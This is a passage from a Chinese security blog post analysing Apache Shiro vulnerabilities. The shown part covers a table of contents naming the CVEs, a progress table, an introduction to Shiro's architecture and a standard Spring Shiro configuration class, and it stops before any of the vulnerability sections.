class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2"><span class="toc-number">4.3.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.3.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#contextPath%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">contextPath问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">另一种绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">4.3.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-12422-Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text">CVE-2019-12422(Shiro-721反序列化漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-3"><span class="toc-number">4.4.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3"><span class="toc-number">4.4.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">4.4.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-number">4.4.4.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.4.1.</span> <span class="toc-text">CBC字节翻转攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#CBC%E6%A8%A1%E5%BC%8F"><span class="toc-number">4.4.4.1.1.</span> <span class="toc-text">CBC模式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">4.4.4.1.2.</span> <span class="toc-text">攻击原理</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A1%AB%E5%85%85%E7%AE%97%E6%B3%95"><span class="toc-number">4.4.4.2.</span> <span class="toc-text">填充算法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#PKCS-7"><span class="toc-number">4.4.4.2.1.</span> <span class="toc-text">PKCS#7</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Padding-Oracle-Attack"><span class="toc-number">4.4.4.3.</span> <span class="toc-text">Padding Oracle Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">4.4.4.3.1.</span> <span class="toc-text">流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">4.4.5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">4.4.6.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-2"><span class="toc-number">4.4.7.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-682"><span class="toc-number">4.5.</span> <span class="toc-text">Shiro-682</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-4"><span class="toc-number">4.5.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4"><span class="toc-number">4.5.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">4.5.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-number">4.5.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-number">4.5.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-1957-Shiro-682%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.6.</span> <span class="toc-text">CVE-2020-1957(Shiro-682的绕过)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-5"><span class="toc-number">4.6.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5"><span class="toc-number">4.6.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-number">4.6.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-number">4.6.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-number">4.6.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-3"><span class="toc-number">4.6.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11989"><span class="toc-number">4.7.</span> <span class="toc-text">CVE-2020-11989</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-6"><span class="toc-number">4.7.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9AURL%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81"><span class="toc-number">4.7.2.</span> <span class="toc-text">绕过方式一：URL二次解码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6"><span class="toc-number">4.7.2.1.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-number">4.7.2.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="toc-number">4.7.2.3.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9AShiro%E4%B8%8ESpring%E5%A4%84%E7%90%86%E8%B7%AF%E5%BE%84%E5%B7%AE%E5%BC%82%E5%8C%96"><span class="toc-number">4.7.3.</span> <span class="toc-text">绕过方式二：Shiro与Spring处理路径差异化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7"><span class="toc-number">4.7.3.1.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-number">4.7.3.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7"><span class="toc-number">4.7.3.3.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="toc-number">4.7.4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-4"><span class="toc-number">4.7.5.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-13933"><span class="toc-number">4.8.</span> <span class="toc-text">CVE-2020-13933</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-7"><span class="toc-number">4.8.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-8"><span class="toc-number">4.8.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8"><span class="toc-number">4.8.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8"><span class="toc-number">4.8.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-7"><span class="toc-number">4.8.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-5"><span class="toc-number">4.8.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-17510"><span class="toc-number">4.9.</span> <span class="toc-text">CVE-2020-17510</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-8"><span class="toc-number">4.9.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-9"><span class="toc-number">4.9.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9"><span class="toc-number">4.9.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-9"><span class="toc-number">4.9.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-8"><span class="toc-number">4.9.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-6"><span class="toc-number">4.9.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-17523"><span class="toc-number">4.10.</span> <span class="toc-text">CVE-2020-17523</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-9"><span class="toc-number">4.10.0.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-10"><span class="toc-number">4.10.0.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10"><span class="toc-number">4.10.0.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-10"><span class="toc-number">4.10.0.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="toc-number">4.10.0.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-7"><span class="toc-number">4.10.0.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-41303"><span class="toc-number">4.11.</span> <span class="toc-text">CVE-2021-41303</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-10"><span class="toc-number">4.11.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-11"><span class="toc-number">4.11.2.</span> <span class="toc-text">#### 漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11"><span class="toc-number">4.11.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-11"><span class="toc-number">4.11.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-10"><span class="toc-number">4.11.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-32532"><span class="toc-number">4.12.</span> <span class="toc-text">CVE-2022-32532</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-11"><span class="toc-number">4.12.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-12"><span class="toc-number">4.12.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-12"><span class="toc-number">4.12.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-12"><span class="toc-number">4.12.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-11"><span class="toc-number">4.12.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-8"><span class="toc-number">4.12.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-40664"><span class="toc-number">4.13.</span> <span class="toc-text">CVE-2022-40664</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-12"><span class="toc-number">4.13.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-13"><span class="toc-number">4.13.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-13"><span class="toc-number">4.13.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-13"><span class="toc-number">4.13.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-12"><span class="toc-number">4.13.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-9"><span class="toc-number">4.13.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-22602"><span class="toc-number">4.14.</span> <span class="toc-text">CVE-2023-22602</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-14"><span class="toc-number">4.14.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-13"><span class="toc-number">4.14.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-46750"><span class="toc-number">4.15.</span> <span class="toc-text">CVE-2023-46750</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-13"><span class="toc-number">4.15.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-14"><span class="toc-number">4.15.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-14"><span class="toc-number">4.15.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-15"><span class="toc-number">4.15.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-14"><span class="toc-number">4.15.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-10"><span class="toc-number">4.15.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">5.</span> <span class="toc-text">后续</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Shiro漏洞分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一篇早该完成的文章，中间因为一些事情断断续续补完。主要从源码分析截止25年初Apache Shiro的一些漏洞。</p>
<p>进度：</p>
<table>
<thead>
<tr>
<th align="center">CVE ID</th>
<th align="center">进度</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CVE-2010-3863</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2014-0074</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CVE-2016-4437（Shiro-550）</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2016-6802</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2019-12422（Shiro-721</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2020-1957(Shiro-682的绕过)</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2020-11989</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2020-13933</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2020-17510</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2020-17523</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2021-41303</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2022-32532</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2022-40664</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2023-22602</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">CVE-2023-34478</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CVE-2023-46749</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CVE-2023-46750</td>
<td align="center">√</td>
</tr>
</tbody></table>
<p>在开始写这篇的时候，迟迟不能动笔，因为不知道我该如何开始讲述接下来的内容，如果从框架的功能，流程一步步分析，会不会太过繁琐和乏味？只介绍漏洞又是否太让刚接触的同学感觉迷糊？</p>
<h2 id="框架简介"><a href="#框架简介" class="headerlink" title="框架简介"></a>框架简介</h2><p>就十分简略说一下吧，具体体关于Shiro的框架的知识可以看Shiro官方文档：<a target="_blank" rel="noopener" href="https://shiro.apache.org/reference.html">Apache Shiro Reference Documentation | Apache Shiro</a>。觉得看英文费劲可以看该中文文档：<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/apache-shiro/1.5.3/reference/introduction.html">Apache Shiro 中文文档</a></p>
<p>Apache Shiro 是一个功能强大的易于使用的 Java 安全框架，主要用于处理以下四个核心方面：身份验证（Authentication）、授权（Authorization）、会话管理（Session Management）和加密（Cryptography）。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/ShiroFeatures.png" alt="ShiroFeatures"></p>
<p><strong>典型架构：</strong><br>Shiro 的一个典型应用包括以下组件：</p>
<ul>
<li><strong>Subject：</strong> 代表当前用户的安全操作者。</li>
<li><strong>SecurityManager：</strong> 核心接口，Shiro 的所有安全操作都通过它来协调。</li>
<li><strong>Realm：</strong> 用于从数据存储中获取安全数据（如用户、角色和权限信息），类似于桥梁。</li>
</ul>
<h2 id="框架流程"><a href="#框架流程" class="headerlink" title="框架流程"></a>框架流程</h2><p>那么还是说明一下框架的一个流程，熟悉的同学可以跳过该部分哦。我将其分为初始化流程和启动之后拦截过滤的流程。</p>
<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><p>先简单说一下大致一个流程</p>
<ol>
<li><p>创建 Shiro 配置</p>
</li>
<li><p>创建 Shiro 的 <code>SecurityManager</code></p>
</li>
<li><p>注册 Realm</p>
</li>
<li><p>配置 Filter</p>
</li>
<li><p>启动 Shiro</p>
</li>
</ol>
<p>用朋友的一句话</p>
<blockquote>
<p>所有的开始，都是从配置开始,配置的方式主要有两种：编程式配置，配置文件读取与解析（利用反射机制，调用构造函数，setter,getter)，初始化的对象，主要是SecurityManager</p>
</blockquote>
<p>由于我的环境主要用到了shiro-spring这个依赖包，是 Apache Shiro 项目为 Spring 框架提供的支持模块。因此配置可以写在java文件里，而无需shiro.ini。代码参考：<a target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/16/Java-Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Java Shiro 权限绕过多漏洞分析 | Drunkbaby’s Blog</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 创建 ShiroFilterFactoryBean</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier(&quot;securityManager&quot;)</span> DefaultWebSecurityManager securityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line">        Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        filterMap.put(<span class="string">&quot;/user/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/toLogin&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 DefaultWebSecurityManager</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;securityManager&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;userRealm&quot;)</span> UserRealm userRealm)</span> &#123;</span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">        securityManager.setRealm(userRealm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 realm 对象</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserRealm <span class="title function_">userRealm</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserRealm</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的一个Shiro的配置类，我们是定义了三个bean。在默认情况下，Spring 初始化 Bean 的顺序通常是由依赖关系决定的。</p>
<p><strong><code>userRealmBean</code></strong>：userRealm 是一个独立的 Bean，没有依赖其他 Bean，因此它将首先被创建。</p>
<p><strong><code>securityManager Bean</code></strong>：securityManager Bean 依赖于 userRealm，因为它在构造时将 userRealm 作为参数传递。Spring 在创建 securityManager Bean 时会先实例化 userRealm，然后将它注入到 securityManager 中。</p>
<p><strong><code>shiroFilterFactoryBean Bean</code></strong>：shiroFilterFactoryBean 依赖于 securityManager。在创建此 Bean 时，Spring 会先确保 securityManager 已经被创建并初始化，然后再将其注入到 shiroFilterFactoryBean 中。</p>
<p>因此，Bean 的初始化顺序为：</p>
<ol start="6">
<li><code>userRealm</code> → 首先被初始化。</li>
<li><code>securityManager</code> → 依赖于 <code>userRealm</code> ，在 <code>userRealm</code> 初始化后初始化。</li>
